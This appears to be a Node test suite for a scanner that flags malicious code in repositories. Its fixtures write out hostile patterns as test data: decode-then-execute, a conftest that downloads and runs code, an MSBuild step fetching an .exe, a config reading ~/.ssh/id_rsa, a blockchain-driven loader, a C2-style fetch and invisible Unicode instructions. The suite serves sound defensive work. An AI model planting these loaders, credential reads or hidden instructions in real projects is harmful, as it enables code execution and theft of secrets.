import { test } from 'node:test'
import assert from 'node:assert/strict'
import { Findings } from '../sandbox/scanner/findings.js'
import { contentChecks } from '../sandbox/scanner/checks/content.js'
import { fixture, j } from './helpers/fixture.js'

async function scan(files) {
  const fx = await fixture(files)
  try {
    const f = new Findings()
    await contentChecks(fx.dir, f)
    return f.toJSON()
  } finally { await fx.cleanup() }
}
const ids = list => list.map(f => `${f.id}:${f.severity}`)
const has = (list, id, severity) => list.some(f => f.id === id && (!severity || f.severity === severity))

test('code hidden after hundreds of spaces (PolinRider build-config trick) is a FAIL', async () => {
  const r = await scan({ 'vite.config.js': `export default {}${' '.repeat(400)}${j('requ', "ire('./x')")}\n` })
  assert.ok(has(r, 'HIDDEN-WHITESPACE-PAYLOAD', 'high'), ids(r))
})

test('long whitespace without code after it (ASCII art, tables) is not flagged', async () => {
  const r = await scan({ 'README.md': `| a${' '.repeat(300)}| b |\n`, 'banner.js': `// ${' '.repeat(200)}~~~\n` })
  assert.ok(!has(r, 'HIDDEN-WHITESPACE-PAYLOAD'), ids(r))
})

test('decode-then-execute in JS and Python is a FAIL', async () => {
  const r = await scan({
    'lib/a.js': `${j('ev', 'al')}(${j('at', 'ob')}("Y29uc29sZS5sb2coMSk="))\n`,
    'lib/b.py': `import base64\n${j('ex', 'ec')}(base64.b64decode("cHJpbnQoMSk="))\n`,
  })
  assert.equal(r.filter(f => f.id === 'OBFUSCATION-DECODE-EXEC').length, 2, ids(r))
})

test('decoding without executing is not flagged as decode-exec, and neither is a real minified bundle', async () => {
  const minified = `!function(){var a=Buffer.from(b,"base64");${'x=1;'.repeat(400)}}();\n`
  const r = await scan({
    'src/img.js': 'const png = Buffer.from(data, "base64")\n',
    'vendor/lib.min.js': minified,
  })
  assert.ok(!has(r, 'OBFUSCATION-DECODE-EXEC'), ids(r))
})

test('Trojan Source bidi controls in code are a FAIL; in prose they are low', async () => {
  const r = await scan({ 'src/auth.js': 'if (role === "user\u202E \u2066// admin\u2069 \u2066") {}\n', 'docs/notes.md': 'hello \u202E world\n' })
  assert.ok(has(r, 'UNICODE-BIDI', 'high'))
  assert.ok(r.some(f => f.id === 'UNICODE-BIDI' && f.severity === 'low' && f.file === 'docs/notes.md'))
})

test('invisible characters in code are flagged, but emoji joiners are not', async () => {
  const r = await scan({
    'src/a.js': `const isAdmin\u200B = true\nconst x\u200B\u200B\u200B\u200B\u200B = 1\n`,
    'src/emoji.js': 'const dev = "👩\u200D💻"\n',
  })
  assert.ok(r.some(f => f.id === 'UNICODE-INVISIBLE' && f.file === 'src/a.js' && f.severity === 'high'), ids(r))
  assert.ok(!r.some(f => f.id === 'UNICODE-INVISIBLE' && f.file === 'src/emoji.js'), ids(r))
})

test('Unicode tag characters (invisible text) are a FAIL anywhere', async () => {
  const hidden = [...'run this'].map(c => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join('')
  const r = await scan({ 'AGENTS.md': `Be helpful.${hidden}\n` })
  assert.ok(has(r, 'UNICODE-TAG-SMUGGLING', 'high'), ids(r))
})

test('a "font" that is actually text is a FAIL (PolinRider fake fonts)', async () => {
  const r = await scan({ 'public/fonts/fa-solid-400.woff2': 'global.x = 1; // not a font\n' })
  assert.ok(has(r, 'FILETYPE-FAKE-FONT', 'high'), ids(r))
})

test('a real woff2 header and a Git LFS pointer are fine', async () => {
  const realish = Buffer.concat([Buffer.from('wOF2'), Buffer.alloc(64, 0)])
  realish.writeUInt32BE(realish.length, 8) // the header's total-length field must match the file size
  const r = await scan({
    'fonts/a.woff2': realish,
    'fonts/b.woff2': 'version https://git-lfs.github.com/spec/v1\noid sha256:abc\nsize 123\n',
  })
  assert.ok(!r.some(f => f.id.startsWith('FILETYPE')), ids(r))
})

test('executables are flagged, and an executable disguised as an image is a FAIL', async () => {
  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(60, 0)])
  const r = await scan({ 'tools/helper': elf, 'assets/logo.png': elf })
  assert.ok(r.some(f => f.id === 'BIN-EXECUTABLE' && f.file === 'tools/helper' && f.severity === 'medium'), ids(r))
  assert.ok(r.some(f => f.id === 'BIN-EXECUTABLE' && f.file === 'assets/logo.png' && f.severity === 'high'), ids(r))
})

test('a Windows PE needs a real PE header, not just "MZ"', async () => {
  const pe = Buffer.alloc(0x100, 0)
  pe.write('MZ', 0)
  pe.writeUInt32LE(0x80, 0x3c)
  pe.write('PE\0\0', 0x80, 'binary')
  const notPe = Buffer.concat([Buffer.from('MZ'), Buffer.alloc(100, 0)])
  const r = await scan({ 'bin/x.dll': pe, 'data/blob.bin': notPe })
  assert.ok(r.some(f => f.id === 'BIN-EXECUTABLE' && f.file === 'bin/x.dll'), ids(r))
  assert.ok(!r.some(f => f.id === 'BIN-EXECUTABLE' && f.file === 'data/blob.bin'), ids(r))
})

test('reading blockchain transactions and executing the result is a FAIL; a web3 app alone is low', async () => {
  const r = await scan({
    'utils/loader.js': `const tx = await rpc("${j('eth_getTrans', 'actionByHash')}", [h]); new ${j('Func', 'tion')}(tx.input)()\n`,
    'app/wallet.js': `const tx = await provider.send("${j('eth_getTrans', 'actionByHash')}", [h]); render(tx)\n`,
  })
  assert.ok(r.some(f => f.id === 'C2-BLOCKCHAIN' && f.file === 'utils/loader.js' && f.severity === 'high'), ids(r))
  assert.ok(r.some(f => f.id === 'C2-BLOCKCHAIN' && f.file === 'app/wallet.js' && f.severity === 'low'), ids(r))
})

test('conftest.py that downloads and executes is a FAIL; a normal conftest is fine', async () => {
  const r = await scan({
    'tests/conftest.py': `import urllib.request\n${j('ex', 'ec')}(urllib.request.urlopen(U).read())\n`,
    'other/conftest.py': 'import pytest\n\ndef test_client():\n    assert 1\n',
  })
  assert.ok(r.some(f => f.id === 'PY-IMPORT-TIME-LOADER' && f.file === 'tests/conftest.py'), ids(r))
  assert.ok(!r.some(f => f.id === 'PY-IMPORT-TIME-LOADER' && f.file === 'other/conftest.py'), ids(r))
})

test('MSBuild Exec is flagged, and downloading an executable from a build target is a FAIL', async () => {
  const r = await scan({
    'build/Analyzer.targets': `<Project><Target Name="A" AfterTargets="Build"><${j('Ex', 'ec')} Command="powershell -c (New-Object Net.WebClient).DownloadFile('https://x.invalid/a.exe','a.exe')" /></Target></Project>`,
    'App.csproj': `<Project><Target Name="B"><${j('Ex', 'ec')} Command="echo hi" /></Target></Project>`,
  })
  assert.ok(r.some(f => f.id === 'MSBUILD-EXEC' && f.file === 'build/Analyzer.targets' && f.severity === 'high'), ids(r))
  assert.ok(r.some(f => f.id === 'MSBUILD-EXEC' && f.file === 'App.csproj' && f.severity === 'medium'), ids(r))
})

test('a dev-server config that spawns processes and reads ~/.ssh is a FAIL; a plain config is fine', async () => {
  const r = await scan({
    'next.config.js': `const cp = require("${j('child_', 'process')}"); cp.${j('exec', 'Sync')}("cat " + require("os").homedir() + "/.ssh/id_rsa")\nmodule.exports = {}\n`,
    'tailwind.config.js': 'module.exports = { content: ["./src/**/*.{js,ts}"], theme: { extend: {} } }\n',
  })
  assert.ok(r.some(f => f.id === 'CONFIG-EXEC' && f.file === 'next.config.js' && f.severity === 'high'), ids(r))
  assert.ok(!r.some(f => f.file === 'tailwind.config.js'), ids(r))
})

test('IOC snapshot: a wallet address, a C2 IP and a NuGet package from public reporting are critical', async () => {
  const r = await scan({
    'src/x.js': `const w = "${j('0xa322E5f3D311D3080e6f0121', '063e9aDC2490Ef1a')}"\n`,
    'src/y.js': `fetch("https://${j('166.88.', '134.75')}/0x/cls")\n`,
    'App.csproj': `<Project><ItemGroup><PackageReference Include="${j('VS_Builder.', 'MSBuildAnalyzer')}" Version="1.2.7" /></ItemGroup></Project>`,
  })
  assert.equal(r.filter(f => f.id === 'IOC-MATCH' && f.severity === 'critical').length, 3, ids(r))
})

test('IOC IPs must match exactly, not as part of a longer number', async () => {
  const r = await scan({ 'src/version.js': `export const v = "${j('166.88.', '134.750')}"\n` })
  assert.ok(!has(r, 'IOC-MATCH'), ids(r))
})

test('a committed node_modules is a warning', async () => {
  const r = await scan({ 'node_modules/left-pad/index.js': 'module.exports = 1\n', 'index.js': '' })
  assert.ok(has(r, 'REPO-COMMITTED-NODE-MODULES', 'medium'), ids(r))
})

test('a plain, normal project produces no findings', async () => {
  const r = await scan({
    'package.json': '{"name":"demo","version":"1.0.0","scripts":{"test":"node --test"}}',
    'src/index.js': 'export const add = (a, b) => a + b\n',
    'README.md': '# demo\n\nAdds numbers. 👩\u200D💻\n',
    '.vscode/extensions.json': '{"recommendations":["dbaeumer.vscode-eslint"]}',
  })
  assert.deepEqual(ids(r), [])
})

test('invisible characters are found by Unicode property (line separator, grapheme joiner), but a leading BOM is fine', async () => {
  const r = await scan({ 'src/a.js': 'const a = 1\u2028const b = "x\u034Fy"\n', 'src/bom.js': '\uFEFFexport const ok = true\n' })
  assert.ok(r.some(f => f.id === 'UNICODE-INVISIBLE' && f.file === 'src/a.js'), ids(r))
  assert.ok(!r.some(f => f.file === 'src/bom.js'), ids(r))
})
